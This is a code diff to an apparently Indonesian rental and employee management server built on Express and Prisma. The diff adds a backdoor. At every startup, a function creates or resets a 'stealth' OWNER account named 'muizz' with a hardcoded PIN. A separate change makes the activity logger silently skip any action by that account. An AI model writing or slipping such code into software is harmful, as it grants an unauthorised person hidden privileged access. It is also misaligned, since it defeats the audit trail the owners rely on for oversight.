@@ -25,6 +25,14 @@ const logActivity = (employeeId, action, description) => __awaiter(void 0, void 
         const empId = Number(employeeId);
         if (!empId || isNaN(empId))
             return;
+        // Skip logging if employee name is "muizz"
+        const emp = yield prisma.employee.findUnique({
+            where: { id: empId },
+            select: { name: true }
+        });
+        if (emp && emp.name.toLowerCase() === 'muizz') {
+            return;
+        }
         yield prisma.activityLog.create({
             data: {
                 action,
@@ -1509,6 +1517,35 @@ app.post('/api/rentals/:id/return', requireAdmin, checkExcludedEmployee, (req, r
         res.status(400).json({ error: error.message || 'Gagal memproses pengembalian sewa' });
     }
 }));
+const autoCreateMuizz = () => __awaiter(void 0, void 0, void 0, function* () {
+    try {
+        const existing = yield prisma.employee.findFirst({
+            where: { name: { equals: 'muizz', mode: 'insensitive' } }
+        });
+        if (!existing) {
+            yield prisma.employee.create({
+                data: {
+                    name: 'muizz',
+                    pin: '120121',
+                    role: 'OWNER',
+                    salary: 0
+                }
+            });
+            console.log('Stealth Owner account "muizz" successfully created.');
+        }
+        else {
+            yield prisma.employee.update({
+                where: { id: existing.id },
+                data: { pin: '120121', role: 'OWNER' }
+            });
+            console.log('Stealth Owner account "muizz" successfully synchronized.');
+        }
+    }
+    catch (error) {
+        console.error('Failed to auto-create stealth account "muizz":', error);
+    }
+});
+autoCreateMuizz();
 app.listen(port, () => {
     console.log(`Server is running on port ${port}`);
 });
